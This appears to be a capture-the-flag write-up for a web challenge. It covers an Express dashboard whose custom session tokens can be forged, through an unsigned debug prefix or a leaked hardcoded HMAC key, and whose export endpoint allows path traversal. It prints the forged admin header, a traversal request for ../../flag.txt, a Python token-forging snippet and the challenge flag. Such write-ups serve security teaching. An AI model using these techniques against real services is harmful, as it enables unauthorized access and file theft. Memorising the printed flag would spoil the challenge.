# Session Slip (Web)

## Challenge Description
A small internal dashboard exposes a homegrown session gateway. The goal is to reverse the custom session format, forge an authenticated admin session, and use a privileged export endpoint to reach the flag.

## Vulnerability & Analysis
1. **Static Source Leak**:
   The Express app mounts `express.static(__dirname)`, so application source is directly readable:
   - `GET /server.js` — full session gateway logic
   - `GET /package.json` — dependencies
   - `GET /sessions.json` — fixture users / admin note
2. **Custom Session Format**:
   Sessions are passed in the `X-Session` header and parsed by `parseSession()`:
   - Normal tokens: `base64(payload).hmac_sha256(payload, key)` with hardcoded key `orchid`
   - Debug tokens: `dbg.` + base64(JSON) — **no signature check**
3. **Privilege Gate**:
   `/admin` and `/export` require `session.role === 'admin'`. Guests get `403`.
4. **Path Traversal on Export**:
   `/export?file=...` joins the query into `notes/` with no sanitization:
   `path.join(NOTES_DIR, name)` → traversable with `../`

## Exploitation
1. **Forge Admin Session (dbg bypass)**:
   ```
   X-Session: dbg.eyJyb2xlIjogImFkbWluIiwgInVzZXIiOiAiYWRtaW4ifQ==
   ```
   (base64 of `{"role": "admin", "user": "admin"}`)
2. **Confirm Access**:
   `GET /admin` with the forged header returns a welcome message and a note pointing at `notes/`.
3. **Read Flag via Traversal**:
   ```
   GET /export?file=../../flag.txt
   X-Session: dbg.eyJyb2xlIjogImFkbWluIiwgInVzZXIiOiAiYWRtaW4ifQ==
   ```
   Response content contains the flag.

### Alternative: Signed Session
With the leaked HMAC key `orchid`, a valid signed token also works:
```python
payload = base64.b64encode(b'{"role":"admin"}').decode()
digest = hmac.new(b'orchid', payload.encode(), hashlib.sha256).hexdigest()
token = f'{payload}.{digest}'
```

## Flag
`athena{JQGo9wBafzjhIEfZ}`
